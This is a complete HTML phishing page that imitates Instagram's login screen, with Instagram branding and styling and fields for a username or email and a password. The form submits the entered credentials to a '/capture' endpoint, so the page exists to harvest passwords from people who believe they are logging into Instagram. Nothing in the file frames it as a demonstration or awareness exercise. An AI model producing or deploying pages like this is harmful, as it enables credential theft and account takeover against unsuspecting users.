<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fafafa; }
        .login-box { width: 350px; margin: 100px auto; padding: 20px; background: #fff; border: 1px solid #ddd; border-radius: 1px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
        .login-box h1 { text-align: center; font-size: 24px; margin-bottom: 20px; }
        .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 3px; }
        .login-box button { width: 100%; padding: 10px; background: #3897f0; color: #fff; border: none; border-radius: 3px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>Instagram</h1>
        <form action="/capture" method="POST">
            <input type="email" name="email" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
